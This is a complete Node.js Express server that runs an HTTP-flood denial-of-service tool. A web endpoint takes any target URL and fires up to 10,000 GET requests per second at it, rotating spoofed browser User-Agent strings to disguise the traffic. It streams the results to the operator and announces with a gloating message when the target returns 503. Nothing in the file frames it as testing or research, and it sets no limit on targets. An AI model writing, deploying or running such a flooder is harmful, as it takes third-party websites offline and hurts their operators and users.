const express = require('express');
const axios = require('axios');
const app = express();
const path = require('path');

const userAgents = [
    'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
    'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
    'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
    'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
    'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
    'Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0',
    'Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g',
    'Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)',
    'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125',
    'Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)',
    'Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413'
];

let continueAttack = false;

app.use(express.static('public'));

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.get('/start-attack', (req, res) => {
    if (continueAttack) {
        res.status(400).send('Attack is already running.');
        return;
    }

    const url = req.query.url;
    continueAttack = true;

    const maxRequests = 5000000000;
    const requestsPerSecond = 10000;

    res.writeHead(200, {
        'Content-Type': 'text/event-stream',
        'Cache-Control': 'no-cache',
        'Connection': 'keep-alive',
        'Access-Control-Allow-Origin': '*'
    });

    const attack = () => {
        if (!continueAttack) return;

        const userAgent = userAgents[Math.floor(Math.random() * userAgents.length)];
        const headers = { 'User-Agent': userAgent };

        axios.get(url, { headers })
            .then((response) => {
                if (response.status === 503) {
                    res.write('data: BOOM BAGSAK ANG GAGO HAHAHA 🤣🤣\n\n');
                    continueAttack = false; // Stop the attack
                } else {
                    res.write(`data: Status Code: ${response.status}\n\n`);
                }
            })
            .catch((error) => {
                if (error.response && error.response.status === 502) {
                    res.write('data: Error: Request failed with status code 502\n\n');
                } else {
                    res.write(`data: Error: ${error.message}\n\n`);
                }
            });

        if (continueAttack) {
            setTimeout(attack, 1000 / requestsPerSecond);
        } else {
            res.end();
        }
    };

    attack();

    setTimeout(() => {
        continueAttack = false;
        res.end();
    }, maxRequests / requestsPerSecond * 1000);

    req.on('close', () => {
        continueAttack = false;
    });
});

app.get('/stop-attack', (req, res) => {
    continueAttack = false;
    res.json({ message: 'Attack stopped.' });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));